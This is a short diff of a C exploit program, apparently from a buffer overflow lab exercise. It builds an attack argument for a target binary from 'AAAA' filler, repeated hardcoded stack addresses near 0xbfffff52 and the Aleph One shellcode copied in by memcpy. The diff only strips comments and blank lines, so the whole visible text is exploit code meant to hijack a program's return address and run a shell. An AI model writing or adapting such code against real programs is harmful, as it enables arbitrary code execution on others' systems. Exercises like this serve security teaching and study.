@@ -15,11 +15,7 @@ int main(void)
   args[0] = TARGET;
   
   char addrToAdd[] = "\x52\xff\xff\xbf";
-
-  //add
-  // 0xbf ff ff 7f
   char dst[24] = "\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf\x52\xff\xff\xbf";
-
 
   args[1] = dst+4; 
   
@@ -28,8 +24,6 @@ int main(void)
   char att[61] = "";
   
   strcat(att, "\x41\x41\x41\x41");
-  
-  //add+28
   strcat(att, "\x5a\xff\xff\xbf");
   memcpy(att+8 , shellcodeAlephOne , sizeOfShell*sizeof(char));
   
